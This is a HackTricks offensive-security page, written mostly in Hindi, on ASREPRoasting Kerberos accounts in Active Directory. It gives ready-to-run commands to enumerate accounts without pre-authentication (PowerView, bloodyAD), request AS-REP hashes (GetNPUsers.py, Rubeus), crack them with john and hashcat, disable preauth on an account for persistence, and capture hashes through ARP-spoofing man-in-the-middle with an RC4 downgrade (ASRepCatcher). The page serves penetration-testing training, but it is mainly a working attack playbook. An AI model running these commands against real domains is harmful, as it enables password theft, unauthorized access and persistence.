# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast एक सुरक्षा हमला है जो उन उपयोगकर्ताओं का लाभ उठाता है जिनमें **Kerberos प्री-प्रमाणीकरण आवश्यक विशेषता** नहीं होती। मूल रूप से, यह कमजोरियों हमलावरों को उपयोगकर्ता के लिए डोमेन कंट्रोलर (DC) से प्रमाणीकरण का अनुरोध करने की अनुमति देती है बिना उपयोगकर्ता के पासवर्ड की आवश्यकता के। फिर DC उपयोगकर्ता के पासवर्ड-व्युत्पन्न कुंजी के साथ एन्क्रिप्टेड संदेश के साथ प्रतिक्रिया करता है, जिसे हमलावर ऑफ़लाइन क्रैक करने का प्रयास कर सकते हैं ताकि उपयोगकर्ता का पासवर्ड पता चल सके।

इस हमले की मुख्य आवश्यकताएँ हैं:

- **Kerberos प्री-प्रमाणीकरण की कमी**: लक्षित उपयोगकर्ताओं में यह सुरक्षा विशेषता सक्षम नहीं होनी चाहिए।
- **डोमेन कंट्रोलर (DC) से कनेक्शन**: हमलावरों को अनुरोध भेजने और एन्क्रिप्टेड संदेश प्राप्त करने के लिए DC तक पहुंच की आवश्यकता होती है।
- **वैकल्पिक डोमेन खाता**: एक डोमेन खाता होने से हमलावरों को LDAP क्वेरी के माध्यम से कमजोर उपयोगकर्ताओं की पहचान करने में अधिक कुशलता मिलती है। बिना ऐसे खाते के, हमलावरों को उपयोगकर्ता नामों का अनुमान लगाना होगा।

#### कमजोर उपयोगकर्ताओं की गणना करना (डोमेन क्रेडेंशियल की आवश्यकता)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP संदेश का अनुरोध करें
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP रोस्टिंग Rubeus के साथ 4768 उत्पन्न करेगा जिसमें एन्क्रिप्शन प्रकार 0x17 और प्रीऑथ प्रकार 0 होगा।

### क्रैकिंग
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistence

एक उपयोगकर्ता के लिए **preauth** को मजबूर करना आवश्यक नहीं है जहाँ आपके पास **GenericAll** अनुमतियाँ (या गुण लिखने की अनुमतियाँ) हैं:
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
## ASREProast बिना क्रेडेंशियल्स

एक हमलावर मैन-इन-द-मिडल स्थिति का उपयोग करके AS-REP पैकेट्स को नेटवर्क के माध्यम से कैप्चर कर सकता है बिना कि Kerberos प्री-ऑथेंटिकेशन को बंद करने पर निर्भर किए। इसलिए, यह VLAN पर सभी उपयोगकर्ताओं के लिए काम करता है।\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) हमें ऐसा करने की अनुमति देता है। इसके अलावा, यह उपकरण क्लाइंट वर्कस्टेशनों को Kerberos बातचीत को बदलकर RC4 का उपयोग करने के लिए मजबूर करता है।
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## संदर्भ

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

---

{{#include ../../banners/hacktricks-training.md}}
